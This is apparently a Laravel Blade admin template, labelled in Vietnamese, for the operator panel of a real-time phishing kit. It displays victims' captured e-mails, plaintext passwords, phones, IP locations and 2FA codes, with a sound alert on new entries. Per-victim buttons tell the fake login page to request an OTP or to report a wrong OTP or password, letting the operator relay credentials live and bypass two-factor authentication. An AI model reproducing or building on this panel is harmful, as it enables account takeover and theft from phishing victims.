@extends('admin_layout')
@section('content')
<div class="container-fluid" id="ctlAdmin">
    <audio id="audioPlayer" src="{{asset('image/notification-9-158194.mp3')}}" hidden preload="auto"></audio>

    <div class="row pl-3 pr-3 table-responsive" style="width: unset;">
        <div class="custom-control custom-switch mb-3" style="cursor: pointer;">
            <input type="checkbox" class="custom-control-input" id="customSwitch1" style="cursor: pointer;" v-model="soundNotify" @change="handleCheckboxChange">
            <label style="cursor: pointer;" class="custom-control-label" for="customSwitch1">Thông báo âm thanh</label>
        </div>
        <table class="table table-striped">
            <thead>
              <tr>
                {{-- <th scope="col">Username</th> --}}
                <th scope="col">E-mail</th>
                <th scope="col">Password</th>
                <th scope="col">Phone</th>
                <th scope="col">IP Address</th>
                <th scope="col">Date</th>
                <th scope="col">2FA</th>
                <th scope="col">Action</th>
                <th scope="col">Action</th>
                <th scope="col">Action</th>
              </tr>
            </thead>
            <tbody>
                <tr v-for="(item, index) in dataList" :key="index">
                    {{-- <td>@{{item.username}}</td> --}}
                    <td><p class="text-dark font-weight-bolder">@{{item.email}}</p></td>
                    <td><p class="text-dark font-weight-bolder">@{{item.password}}</p></td>
                    <td>@{{item.phone}}</td>
                    <td>@{{item.ip_address}} <br> @{{item.ip_location}}</td>
                    <td>@{{item.date}}</td>

                    <td v-if="item['2fa']">@{{item['2fa']}}</td>
                    <td v-else><button style="font-size: 14px;" class="btn btn-primary" @click="passwordCorrectClick(item.id)">Yêu cầu OTP</button></td>

                    <td><button style="font-size: 14px;" class="btn btn-warning" @click="OTPWrongClick(item.id)">OTP Sai</button></td>
                    <td><button style="font-size: 14px;" class="btn btn-success" @click="OTPCorrectClick(item.id)">OTP Đúng</button></td>
                    <td><button style="font-size: 14px;" class="btn btn-danger" @click="passwordWrongClick(item.id)">Sai mật khẩu</button></td>
                </tr>
            </tbody>
          </table>
    </div>
    <!-- Content Row -->

    {{-- Modal form --}}
    <div class="modal fade" id="changePassword" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="staticBackdropLabel">Đổi mật khẩu</h5>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label for="oldPassword">Mật khẩu cũ</label>
                    <input type="password" class="form-control" id="oldPassword" v-model="FormDataChangePassword.oldPassword">
                  </div>
                  <div class="form-group">
                    <label for="newPassword">Mật khẩu mới</label>
                    <input type="password" class="form-control" id="newPassword" v-model="FormDataChangePassword.newPassword">
                  </div>
                <small v-if="formChangePasswordError['status'] != undefined" class="text-danger error-change-password">@{{formChangePasswordError['status']}}</small>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-dismiss="modal">Đóng</button>
              <button type="button" class="btn btn-primary" @click="submitChangePassword()">Lưu</button>
            </div>
          </div>
        </div>
      </div>

    {{-- Modal form --}}

    <div class="modal fade" id="changeIP" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="staticBackdropLabel">IP Access Token</h5>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
                {{-- <div class="form-group">
                    <label>Token hiện tại</label>
                    <input type="text" class="form-control" value="" readonly>
                  </div> --}}
                  <div class="form-group">
                    <label for="newIP">Token cập nhật</label>
                    <input type="text" class="form-control" id="newIP" v-model="FormDataChangeIP.ipUpdate">
                  </div>
                <small v-if="formChangeIPError['status'] != undefined" class="text-danger error-change-password">@{{formChangeIPError['status']}}</small>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-dismiss="modal">Đóng</button>
              <button type="button" class="btn btn-primary" @click="submitChangeIP()">Lưu</button>
            </div>
          </div>
        </div>
      </div>

    {{-- Modal form --}}
</div>
@endsection
@section('script')
    <script>
        $(".modal").on("hidden.bs.modal", function(){
            $(".error-change-password").html("");
        });
    </script>
    <script type="text/javascript" src="{{ mix('/js/modules/admin.js') }}"  charset="utf-8"></script>
@endsection
